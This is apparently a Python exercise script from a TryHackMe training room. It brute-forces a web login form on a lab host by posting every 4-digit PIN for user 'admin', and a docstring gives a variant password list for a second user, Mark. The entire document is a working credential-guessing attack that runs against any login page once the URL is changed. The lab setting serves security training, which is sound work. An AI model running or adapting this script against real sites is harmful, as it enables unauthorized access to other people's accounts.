# Bruteforce web login page
# THM room: Custom Tooling Using Python

'''
For this example you know username is admin and the password hint is "4-digit numeric"

Part two of this: Can you log in as Mark?
His password consists of the first three characters as digits (000-999) followed by a single uppercase letter (A-Z)
change the password_list to: password_list = [f"{str(i).zfill(3)}{letter}" for i in range(1000) for letter in string.ascii_uppercase]

'''

import requests

url = "http://python.thm/labs/lab1/index.php"

username = "admin"

# Generating 4-digit numeric passwords (0000-9999)
password_list = [str(i).zfill(4) for i in range(10000)]

def brute_force():
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        
        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break
        else:
            print(f"[-] Attempted: {password}")

brute_force()
